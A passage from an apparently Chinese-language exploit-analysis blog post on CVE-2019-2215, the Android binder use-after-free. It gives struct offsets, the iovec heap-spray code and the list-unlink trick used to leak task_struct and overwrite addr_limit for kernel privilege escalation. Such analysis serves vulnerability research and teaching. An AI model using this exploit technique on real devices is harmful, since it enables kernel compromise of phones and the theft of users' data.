</span><span style="color:#75715e">        * queue head.
</span><span style="color:#75715e">        */</span>
        wait_queue_t wait;

        <span style="color:#75715e">/* The wait queue head that linked the &#34;wait&#34; wait queue item */</span>
        wait_queue_head_t <span style="color:#f92672">*</span>whead;
};
</code></pre></td></tr></table>
</div>
</div><p>所以当最终走到<code>__list_del</code>时，里面的unlink操作<code>next-&gt;prev=prev</code>通过构造一个虚假的binder_thread 对象在已经被free的binder_thread对应的地址处，就可以完成泄漏内存信息和关键数据修改。</p>
<h3 id="21-preparing">2.1 Preparing</h3>
<p>要做kernel里的堆布局，那就必须要对想要覆盖的结构体有足够的了解。这里先看一下<code>binder_thread</code>的代码。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">/**
</span><span style="color:#75715e"> * struct binder_thread - binder thread bookkeeping
</span><span style="color:#75715e"> * @proc:                 binder process for this thread
</span><span style="color:#75715e"> *                        (invariant after initialization)
</span><span style="color:#75715e"> * @rb_node:              element for proc-&gt;threads rbtree
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @waiting_thread_node:  element for @proc-&gt;waiting_threads list
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @pid:                  PID for this thread
</span><span style="color:#75715e"> *                        (invariant after initialization)
</span><span style="color:#75715e"> * @looper:               bitmap of looping state
</span><span style="color:#75715e"> *                        (only accessed by this thread)
</span><span style="color:#75715e"> * @looper_needs_return:  looping thread needs to exit driver
</span><span style="color:#75715e"> *                        (no lock needed)
</span><span style="color:#75715e"> * @transaction_stack:    stack of in-progress transactions for this thread
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @todo:                 list of work to do for this thread
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @process_todo:         whether work in @todo should be processed
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @return_error:         transaction errors reported by this thread
</span><span style="color:#75715e"> *                        (only accessed by this thread)
</span><span style="color:#75715e"> * @reply_error:          transaction errors reported by target thread
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @wait:                 wait queue for thread work
</span><span style="color:#75715e"> * @stats:                per-thread statistics
</span><span style="color:#75715e"> *                        (atomics, no lock needed)
</span><span style="color:#75715e"> * @tmp_ref:              temporary reference to indicate thread is in use
</span><span style="color:#75715e"> *                        (atomic since @proc-&gt;inner_lock cannot
</span><span style="color:#75715e"> *                        always be acquired)
</span><span style="color:#75715e"> * @is_dead:              thread is dead and awaiting free
</span><span style="color:#75715e"> *                        when outstanding transactions are cleaned up
</span><span style="color:#75715e"> *                        (protected by @proc-&gt;inner_lock)
</span><span style="color:#75715e"> * @task:                 struct task_struct for this thread
</span><span style="color:#75715e"> *
</span><span style="color:#75715e"> * Bookkeeping structure for binder threads.
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">binder_thread</span> {
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">binder_proc</span> <span style="color:#f92672">*</span>proc;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">rb_node</span> rb_node;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> waiting_thread_node;
        <span style="color:#66d9ef">int</span> pid;
        <span style="color:#66d9ef">int</span> looper;              <span style="color:#75715e">/* only modified by this thread */</span>
        <span style="color:#66d9ef">bool</span> looper_need_return; <span style="color:#75715e">/* can be written by other thread */</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">binder_transaction</span> <span style="color:#f92672">*</span>transaction_stack;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> todo;
        <span style="color:#66d9ef">bool</span> process_todo;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">binder_error</span> return_error;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">binder_error</span> reply_error;
        wait_queue_head_t wait;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">binder_stats</span> stats;
        atomic_t tmp_ref;
        <span style="color:#66d9ef">bool</span> is_dead;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">task_struct</span> <span style="color:#f92672">*</span>task;
};
</code></pre></td></tr></table>
</div>
</div><p>这里我们需要注意的是整个binder_thread的size以及<code>wait</code>和<code>task</code>的偏移。因为最终我们的目的是构造一个和binder_thread类似size的内核变量去复用同一块内存，然后利用删除链表时对<code>wait</code>的操作去获取<code>task</code>的值，然后再次利用unlink去改写<code>addr_limit</code>。通过调试，我们可以得到<code>binder_thread</code>的size为<strong>0x198</strong>, <code>wait</code>的offset为<strong>0xA0</strong>, <code>task</code>的offset为<strong>0x190</strong>.</p>
<p><img src="/images/cve20192215/binder_thread_infos.png" alt="binder thread size"></p>
<h3 id="22-kernel-object-choosing">2.2 Kernel Object Choosing</h3>
<p>为了能够成功复写被Free的binder_thread所在的内存区域，我们需要构造一个大小类似的内核结构或者对象，这里选用的是<code>struct iovec</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">// sizeof(iovec) = 0x10
</span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">iovec</span>
{
        <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>iov_base;
        __kernel_size_t iov_len;
};
</code></pre></td></tr></table>
</div>
</div><p>通过使用<code>writev</code>和<code>readv</code>，可以用来向指定stream写入存储在不连续内存块（由iovsec[]定义）中的数据，或者从指定stream读出数据写入一些不连续的内存块中。其中<code>iov_base</code>指定每个内存块的地址，<code>iov_len</code>描述每个内存块的size。</p>
<p>使用iovec的其好处在于<code>iov_base</code>和<code>iov_len</code>都是可控的，只要绕过传入内核时对<code>iov_base</code>做的是否在<code>userspace</code>的校验，往后的任意修改都不会有<code>iov_base</code>必须是指向userspace address的校验。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">task_struct</span> {
<span style="color:#75715e">#ifdef CONFIG_THREAD_INFO_IN_TASK
</span><span style="color:#75715e"></span>        <span style="color:#75715e">/*
</span><span style="color:#75715e">        * For reasons of header soup (see current_thread_info()), this
</span><span style="color:#75715e">        * must be the first element of task_struct.
</span><span style="color:#75715e">        */</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">thread_info</span>      thread_info;
        <span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>        <span style="color:#75715e">/* -1 unrunnable, 0 runnable, &gt;0 stopped: */</span>
        <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">long</span>           state;
        ...
};

<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">thread_info</span> {
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>   flags;          <span style="color:#75715e">/* low level flags */</span>
        mm_segment_t    addr_limit;     <span style="color:#75715e">/* address limit */</span>
        <span style="color:#75715e">#ifdef CONFIG_ARM64_SW_TTBR0_PAN
</span><span style="color:#75715e"></span>        u64             ttbr0;          <span style="color:#75715e">/* saved TTBR0_EL1 */</span>
        <span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">int</span>             preempt_count;  <span style="color:#75715e">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span>
        ...
};
</code></pre></td></tr></table>
</div>
</div><p>这里<code>addr_limit</code>的offset是和机器architecture相关的,上面提供的是针对arm64的对应结构的截图，可以看到<code>task_struct</code>的第一个field为<code>thread_info</code>,<code>addr_limit</code>是在<code>thread_info</code>的<strong>0x8</strong>偏移处，所以我们在拿到<code>task_struct</code>的地址后，<strong>0x8</strong> offset处即为<code>addr_limit</code>。</p>
<h3 id="23-leaking-task_structure">2.3 Leaking Task_Structure</h3>
<p>现在和目标结构题相关的信息，需要注意去bypass的点，以及具体利用unlink的点我们已经大概清楚：</p>
<ul>
<li>binder_thread 的size为0x198
<ul>
<li>wait 的offset为0xa0
<ul>
<li>wait.lock的值必须为0,否则执行流无法走到unlink处</li>
</ul>
</li>
<li>task 的offset为 0x190
<ul>
<li>这里我们要leak前次binder_thread的task数据，所以我们在overlap的时候不能覆盖到0x190之后的内容。</li>
</ul>
</li>
</ul>
</li>
<li>arm64下addr_limit位于task_struct 的0x8处</li>
<li>iovec的size为0x10
<ul>
<li>iovec.base 必须是指向用户地址，否则不能通过传入kernel时的校验</li>
</ul>
</li>
</ul>
<p>所以为了能有较大几率在内核复用被释放的binder_thread使用的内存，我们需要
准备一个大小类似的<code>iovec</code> array，再加上我们不能覆盖想要leak的前一个<code>binder_thread.task</code>的内容，所以我们需要准备<code>0x190 / 0x10 = 0x19</code> 个iovec，即<code>iovec[25]</code>，而且为了能利用wait去实现unlink，所以<code>iovec[0xa0 / 0x10]</code>处要准备上符合要求且精心构造的数据。这里借用P0博客里的图片展示内存对应关系：</p>
<p><img src="/images/cve20192215/leak_task_struct.png" alt="leak task_struct"></p>
<p>在确定大概的对应的关系后，我们还需要让相关内存块的内容满足如下要求：</p>
<ul>
<li><code>wait.lock</code> 需要为<strong>0x0</strong></li>
<li><code>iovec.base</code> 必须指向用户空间地址</li>
<li><code>wait.task_list.next</code>和<code>wait.task_list.prev</code>在unlink后都会指向<code>wait.task_list.next</code></li>
</ul>
<p>为了实现这个要求，P0在原文中使用了如下的数据来填充关键内存块：</p>
<p><img src="/images/cve20192215/heap_layout_leaking_task.jpg" alt="heap layout for leaking task"></p>
<p>相关代码如下：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#define BINDER_THREAD_EXIT 0x40046208ul
</span><span style="color:#75715e"></span><span style="color:#75715e">// NOTE: we don&#39;t cover the task_struct* here; we want to leave it uninitialized
</span><span style="color:#75715e"></span><span style="color:#75715e">#define BINDER_THREAD_SZ 0x190
</span><span style="color:#75715e">#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) </span><span style="color:#75715e">//25
</span><span style="color:#75715e"></span><span style="color:#75715e">#define WAITQUEUE_OFFSET 0xA0
</span><span style="color:#75715e">#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) </span><span style="color:#75715e">//10
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// Alloc a userspace memory which will satisfy wait.lock == 0
</span><span style="color:#75715e">// and iovec.base point to userspace
</span><span style="color:#75715e"></span>dummy_page_4g_aligned <span style="color:#f92672">=</span> mmap((<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x100000000UL</span>, <span style="color:#ae81ff">0x2000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);

<span style="color:#75715e">// Forming iovec[25]
</span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">iovec</span> iovec_array[IOVEC_ARRAY_SZ];
memset(iovec_array, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(iovec_array));

iovec_array[IOVEC_INDX_FOR_WQ].iov_base <span style="color:#f92672">=</span> dummy_page_4g_aligned; <span style="color:#75715e">/* spinlock in the low address half must be zero */</span>
iovec_array[IOVEC_INDX_FOR_WQ].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;next */</span>
iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xDEADBEEF</span>; <span style="color:#75715e">/* wq-&gt;task_list-&gt;prev */</span>
iovec_array[IOVEC_INDX_FOR_WQ <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;

<span style="color:#66d9ef">int</span> b;

<span style="color:#66d9ef">int</span> pipefd[<span style="color:#ae81ff">2</span>];
<span style="color:#66d9ef">if</span> (pipe(pipefd)) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;pipe&#34;</span>);
<span style="color:#66d9ef">if</span> (fcntl(pipefd[<span style="color:#ae81ff">0</span>], F_SETPIPE_SZ, <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x1000</span>) err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;pipe size&#34;</span>);
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> page_buffer[<span style="color:#ae81ff">0x1000</span>];
</code></pre></td></tr></table>
</div>
</div><p><code>iovec[0]</code>到<code>iovec[9]</code>里的内容都是<strong>0x0</strong>，对于<code>iovec.base</code>和<code>iovec.len</code>都为<strong>0x0</strong>的元素，在写入和读出时将直接跳过。
对于<code>iovec[10]</code>(对应于<code>wait.lock</code>和<code>wait.task_list.next</code>)和<code>iovec[11]</code>(对应于<code>wait.task_list.prev</code>)，则填入我们精心构造的数据: 为了满足<code>wait.lock</code>(32bit)为<strong>0x0</strong>且<code>iovec.base</code>指向用户空间，我们需要申请一个低32bit全为0的用户空间内存块，P0原文里申请的是<code>0x100000000UL</code>，刚好满足上述两个要求。</p>
<p>前面已经分析过，在触发unlink时，<code>binder_thread.wait</code>是head，对应于<code>eppoll_entry.whead</code>，而要删除的元素对应于<code>eppoll_entry.wait</code>，而要删除的元素是当前list里面唯一的元素，所以删除后留下的只有<code>eppoll_entry.whead</code>本身，此时head的next和prev都指向其自己。这里直接引用P0的解释图：</p>
<p><img src="/images/cve20192215/CVE-2019-2215-UAF-before-list_del.png" alt="before list del">
<img src="/images/cve20192215/CVE-2019-2215-UAF-post-list_del.png" alt="after list del"></p>
<p>unlink前，</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">eppoll_entry.whead<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
eppoll_entry.whaed<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xDEADBEEF</span>;

eppoll_entry.wait<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> eppoll_entry.whead;
eppoll_entry.wait<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> eppoll_entry.wheah;
</code></pre></td></tr></table>
</div>
</div><p>unlink时，根据<code>list_del</code>的代码：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
